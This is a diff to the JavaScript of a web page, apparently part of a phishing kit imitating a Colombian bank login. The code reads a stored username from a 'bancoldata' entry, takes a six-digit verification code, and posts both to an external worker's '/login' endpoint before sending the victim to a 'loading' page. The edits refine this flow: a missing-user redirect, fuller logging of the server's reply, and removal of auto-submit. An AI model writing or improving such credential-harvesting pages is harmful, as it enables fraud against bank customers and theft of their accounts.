@@ -431,9 +431,15 @@
             loadingOverlay.style.display = 'flex';
 
             try {
-                // Obtener datos del localStorage (igual que en el otro archivo)
+                // Obtener datos del localStorage
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 const usuario = bancoldata.usuario;
+
+                if (!usuario) {
+                    alert('Error: Usuario no encontrado');
+                    window.location.href = 'index.html';
+                    return;
+                }
 
                 // Generar transactionId
                 const transactionId = 'txn_' + Date.now();
@@ -448,7 +454,7 @@
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}`);
 
-                // Enviar al worker con la misma estructura que el otro archivo
+                // Enviar al worker
                 const response = await fetch(`${WORKER_URL}/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -469,7 +475,7 @@
                     window.location.href = 'loading.html';
                 } else {
                     // ❌ CÓDIGO INVÁLIDO
-                    console.log('❌ Código inválido');
+                    console.log('❌ Código inválido - Respuesta:', result);
                     mostrarErrorCajas();
                     mostrarAlerta();
                 }
@@ -489,11 +495,7 @@
                 this.value = this.value.slice(0, 6);
             }
             updateButton();
-
-            // Auto-envío cuando se completan 6 dígitos
-            if (this.value.length === 6) {
-                setTimeout(enviarCodigo, 300);
-            }
+            // ❌ ELIMINADO EL AUTO-ENVÍO
         });
 
         button.addEventListener('click', function(e) {
